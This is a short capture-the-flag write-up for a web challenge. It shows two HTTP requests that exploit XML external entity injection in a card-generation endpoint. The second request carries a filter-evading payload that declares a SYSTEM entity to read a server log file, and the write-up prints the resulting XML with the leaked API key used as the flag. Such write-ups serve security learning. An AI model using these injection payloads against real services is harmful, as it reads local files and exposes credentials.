# Objective

# Solution

First send a request with a bad apiKey to generate log file. Then read log file with second request.

The issue is how they are replacing strings in the xml file. You want to create an entity that is able to read a local file (the log file).

```
### Flag is apiKey really is H858FDSKL49FK09K4590KFK2390KCFVC12

### First send the first request
### Second send the second request

POST https://chal35-g7sg4j.vercel.app/getCRMUsers HTTP/1.1
Content-Type: application/json

{
    "apiKey": "wrong"
}

###

POST https://chal35-g7sg4j.vercel.app/createCard HTTP/1.1
Content-Type: application/json

{
  "role": "role\"> --> <ENTITY!EDOCTYPENDOCTYPETDOCTYPEIDOCTYPETDOCTYPEY role SENTITYYENTITYSENTITYTENTITYEENTITYM \"/tmp/last_req.log",
  "firstName": "fn",
  "lastName": "ln\"> <ENTITY!--"
}

###
```

The second request will generate XML that looks like this: (note the contents of the log file are injected)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE userCard [
<!ENTITY firstName "fn">
<!ENTITY lastName "ln">
<!--"><!ENTITY role "role"> --><!ENTITY role SYSTEM "/tmp/last_req.log">
]>
<userInfo>
<fullRef>fn ln, Expected API Key: H858FDSKL49FK09K4590KFK2390KCFVC12 | Received API Key: wrong</fullRef>
<firstName>fn</firstName>
<lastName>ln</lastName>
</userInfo>
```
